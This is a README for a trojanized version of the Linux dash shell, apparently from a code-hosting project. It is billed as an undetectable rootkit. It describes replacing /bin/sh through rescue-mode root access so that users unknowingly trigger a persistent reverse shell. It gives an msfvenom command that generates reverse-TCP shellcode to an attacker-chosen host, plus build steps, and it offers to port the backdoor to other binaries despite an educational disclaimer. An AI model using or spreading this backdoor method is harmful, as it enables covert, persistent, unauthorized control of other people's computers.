# Dash shell Linux Trojan Backdoor (Undetectable Mar 29, 2023)

The purpose of this is to demonstrate what security risks there are when someone gains physical access to your computer. 

# WARNING
THIS CODE IS MALWARE!!! IT IS A LINUX TROJAN BACKDOOR! IT WILL OPEN A BACKDOOR INTO YOUR COMPUTER SYSTEM AND WILL ALLOW UNAUTHORIZED ACCESS TO IT. EXERCISE EXTREME CAUTION AND USE SECURITY BEST PRACTICES FOR EDUCATION USE. 

# Possiple attack
An attack might look like this: Enter rescue mode and pop a root shell without a password. Replace the /bin/sh binary with this rootkit. The users probably won't know. The shell will still be 100% functional. 
Use this for persistence so the next time an authorized user accesses their account (with the 'sh' shell), you will receive a reverse shell that persists (in a new process) even after the terminal is closed.

The modified code is well documented. 
Change the shellcode in the `pskexec_dash()` function.
You can use a command like `msfvenom -p linux/x64/shell_reverse_tcp PrependFork=true LHOST=0.0.0.0 LPORT=3443 -f raw > shellcode.bin.tmp; xxd -i shellcode.bin.tmp > shellcode-addme.c; rm shellcode.bin.tmp` to generate a replacement. Make sure to change the IP address and port number in the above command to your server.

If you find this code useful, please leave a star ⭐.

# Build
Run the following commands.
```sh
./autogen.sh
./configure
make

# Optional
strip ./src/dash

# DO NOT RUN `make install` OR THE MALWARE WILL INSTALL ON YOUR COMPUTER!!!
```
The binary is located in `./src/dash`.


# Disclaimer
This project was developed for security research, my own curiosity, ethical hacking, and educational purposes. It was intended to be used responsibly. Do not use this code for anything illegal in your jurisdiction. LICENSE TERMS APPLY.

Hack responsibly.

# Requests
If anyone finds this code useful I can port it to other linux binaries. This rootkit is easy to integrate to any other GNU/Linux C/C++ program.

# LEGAL NOTICE
The creators of the orginal "Dash" Software and their affiliates do not support or endorse the project titled "dash-shell-rootkit". The use of the Software in the project is solely at the discretion of this project's creators and contributors. See the COPYING file for the previous "Dash" license.


If you find this code useful, please leave a star ⭐.
